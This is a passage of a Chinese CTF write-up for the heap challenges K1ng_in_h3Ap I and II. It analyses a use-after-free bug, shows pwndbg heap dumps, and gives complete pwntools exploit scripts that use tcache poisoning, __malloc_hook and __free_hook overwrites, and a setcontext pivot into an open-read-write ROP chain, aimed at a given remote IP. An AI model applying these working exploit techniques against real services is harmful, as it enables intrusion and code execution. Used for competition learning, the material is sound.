    payload = p64(libc.sym['__malloc_hook'] - 0x23) + b"\n"
    edit(1, payload)
    add(7, 0x68)
    add(8, 0x68)
    payload = b"\x00"*3 + p64(0)*1 + p64(one_gadget[1] + libc.address) + p64(libc.sym['realloc'] + 8) + b"\n"
    edit(8, payload)
    add(9, 0x68)
    p.interactive()
## K1ng_in_h3Ap_II
这个题目就是在I的基础上进行修改的，这里我们发现libc变成了2.27
    GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
    Copyright (C) 2018 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.
    There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
    PARTICULAR PURPOSE.
    Compiled by GNU CC version 7.5.0.
    libc ABIs: UNIQUE IFUNC
    For bug reporting instructions, please see:
    .
在1.4中加入了对tcache的double free检查，我们先分析一下程序，这里在一开始加入了沙箱，我们不能直接getshell了
    line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
     0002: 0x20 0x00 0x00 0x00000000  A = sys_number
     0003: 0x35 0x00 0x01 0x40000000  if (A  15 )
        exit(0);
      puts("input size:");
      v2 = readint();
      if ( v2  0x60 )
        exit(0);
      buf_list[index] = malloc(v2);
      result = size_list;
      size_list[index] = v2;
      return result;
    }
这里对堆块的大小进行了限制，堆块的大小不能超过0x60个字节。但是其实这里没啥影响，因为这里是用的tcache，tcache从来不检查size。接着看一下delete函数
    void delete()
    {
      int v0; // [rsp+Ch] [rbp-4h]
      puts("input index:");
      v0 = readint();
      if ( v0  15 || !buf_list[v0] )
        exit(0);
      free((void *)buf_list[v0]);
    }
这里还是老问题，在释放的时候没有对buf_list进行清空，因此这里存在UAF的漏洞。然后看一下edit函数
    ssize_t edit()
    {
      int v1; // [rsp+Ch] [rbp-4h]
      puts("input index:");
      v1 = readint();
      if ( v1  15 || !buf_list[v1] )
        exit(0);
      puts("input context:");
      return read(0, (void *)buf_list[v1], (int)size_list[v1]);
    }
edit函数，这里直接用了read进行内容的修改，没有了之前的off-by-one漏洞。然后是show函数直接puts输出了堆块中的内容。
那么现在是tcache
1.4中存在一个UAF的漏洞，那么这里我们首先泄漏一下地址，首先堆地址很好泄漏，释放两个堆块，然后show一个堆块就能泄漏出堆地址来了，但是libc的地址怎么泄漏，我们无法申请0x90大小以上的堆块，因此不能直接将堆块释放到unsroted
bin链表中。这里用到的一个思路就是sscanf函数在接收大量数据的时候会申请超大的内存堆块，而超大的内存堆块会触发堆空间合并的机制，即将fastbin中的堆块全部弄到bins链表中。
那么这里我们首先在fastbin中留一个堆块，然后触发堆合并，再show这个堆块，那么就能泄漏出libc的地址。
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x555555603790 --> 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x555555604200 --> 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x5555556042c0 (size : 0x1fd40)
           last_remainder: 0x0 (size : 0x0)
                unsortbin: 0x0
    (0x20)   tcache_entry[0](7): 0x5555556038b0 --> 0x5555556039c0 --> 0x555555603c70 --> 0x555555603df0 --> 0x555555603c50 --> 0x555555603f00 --> 0x555555603ad0
    (0x50)   tcache_entry[3](1): 0x555555603f20
    (0x60)   tcache_entry[4](7): 0x5555556041b0 --> 0x555555604150 --> 0x5555556040f0 --> 0x555555604090 --> 0x555555604030 --> 0x555555603fd0 --> 0x555555603f70
    (0x70)   tcache_entry[5](7): 0x5555556037c0 --> 0x555555603b60 --> 0x5555556038d0 --> 0x555555603af0 --> 0x555555603c90 --> 0x555555603e10 --> 0x5555556039e0
    (0x80)   tcache_entry[6](5): 0x555555603830 --> 0x555555603940 --> 0x555555603bd0 --> 0x555555603e80 --> 0x555555603a50
    (0xd0)   tcache_entry[11](1): 0x555555603310
    (0xf0)   tcache_entry[13](2): 0x555555603d00 --> 0x555555603670s
执行`p.sendlineafter(">> \n", "1"*0x1100)` 堆空间如下
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x5555556042c0 (size : 0x1fd40)
           last_remainder: 0x0 (size : 0x0)
                unsortbin: 0x0
    (0x020)  smallbin[ 0]: 0x555555603790
    (0x060)  smallbin[ 4]: 0x555555604200 // 合并的堆块
    (0x20)   tcache_entry[0](7): 0x5555556038b0 --> 0x5555556039c0 --> 0x555555603c70 --> 0x555555603df0 --> 0x555555603c50 --> 0x555555603f00 --> 0x555555603ad0
    (0x50)   tcache_entry[3](1): 0x555555603f20
    (0x60)   tcache_entry[4](7): 0x5555556041b0 --> 0x555555604150 --> 0x5555556040f0 --> 0x555555604090 --> 0x555555604030 --> 0x555555603fd0 --> 0x555555603f70
    (0x70)   tcache_entry[5](7): 0x5555556037c0 --> 0x555555603b60 --> 0x5555556038d0 --> 0x555555603af0 --> 0x555555603c90 --> 0x555555603e10 --> 0x5555556039e0
    (0x80)   tcache_entry[6](5): 0x555555603830 --> 0x555555603940 --> 0x555555603bd0 --> 0x555555603e80 --> 0x555555603a50
    (0xd0)   tcache_entry[11](1): 0x555555603310
    (0xf0)   tcache_entry[13](2): 0x555555603d00 --> 0x555555603670
触发堆合并之后就能泄漏出地址。泄漏出libc的地址接下来就好说了，我们直接利用UAF申请堆块到free_hook的位置，将其覆写为setcontext+53，进行栈迁移，执行ORW。但是这里存在一个问题就是我们最大能控制的大小为0x60，而ORW的链肯定大于0x60的，因此这里我们需要先执行一个read的rop，从而读取orw继续执行。
    # -*- coding: utf-8 -*-    import syslog
    from pwn import *
    file_path = "./pwn"
    context.arch = "amd64"
    elf = ELF(file_path)
    debug = 1
    if debug:
        p = process([file_path])
        # gdb.attach(p, "b *$rebase(0xE52)")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
    else:
        p = remote('47.104.175.110', 20066)
        libc = ELF('./libc.so.6')
        one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
    def add(index, size):
        p.sendlineafter(">> \n", "1")
        p.sendlineafter("input index:\n", str(index))
        p.sendlineafter("input size:\n", str(size))
    def delete(index):
        p.sendlineafter(">> \n", "2")
        p.sendlineafter("input index:\n", str(index))
    def edit(index, content):
        p.sendlineafter(">> \n", "3")
        p.sendlineafter("input index:\n", str(index))
        p.sendafter("input context:\n", content)
    def show(index):
        p.sendlineafter(">> \n", "4")
        p.sendlineafter("input index:\n", str(index))
    for i in range(9):
        add(i, 0x58)
    for i in range(8):
        delete(i)
    show(1)
    heap_address = u64(p.recvline().strip().ljust(8, b"\x00"))
    p.sendlineafter(">> \n", "1"*0x1100)
    show(7)
    libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x10 - libc.sym['__malloc_hook'] - 0xb0
    for i in range(7, -1, -1):
        add(i, 0x58)
    delete(0)
    delete(1)
    edit(1, p64(libc.sym['__free_hook']))
    add(1, 0x58)
    add(9, 0x58)
    # # 0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
    # magic = 0x0000000000154930 + libc.address
    p_rdi_r = 0x00000000000215bf + libc.address
    p_rsi_r = 0x0000000000023eea + libc.address
    p_rax_r = 0x0000000000043ae8 + libc.address
    p_rdx_r = 0x0000000000001b96 + libc.address
    syscall = 0x00000000000d2745 + libc.address
    ret = 0x00000000000c0c9d + libc.address
    setcontext = libc.sym['setcontext'] + 53
    orw_address = heap_address + 0xc0
    orw_read_address = orw_address + 0x48
    flag_str_address = libc.sym['__free_hook'] + 0x10
    flag_address = flag_str_address + 0x10
    orw = flat([
        p_rdi_r, flag_str_address,
        p_rsi_r, 0,
        p_rax_r, 2,
        syscall,
        p_rdi_r, 3,
        p_rsi_r, flag_address,
        p_rdx_r, 0x30,
        p_rax_r, 0,
        syscall,
        p_rdi_r, 1,
        p_rsi_r, flag_address,
        p_rdx_r, 0x30,
        p_rax_r, 1,
        syscall
    ])
    orw_read = flat([
        p_rdi_r, 0,
        p_rsi_r, orw_read_address,
        p_rdx_r, 0x200,
        p_rax_r, 0,
        syscall,
    ])
    edit(9, p64(setcontext) + p64(0) + b"./flag")
    payload = b"\x00"*0x40 + p64(orw_address) + p64(ret)
    edit(2, payload)
    edit(3, orw_read)
    delete(1)
    p.sendline(orw)
    p.interactive()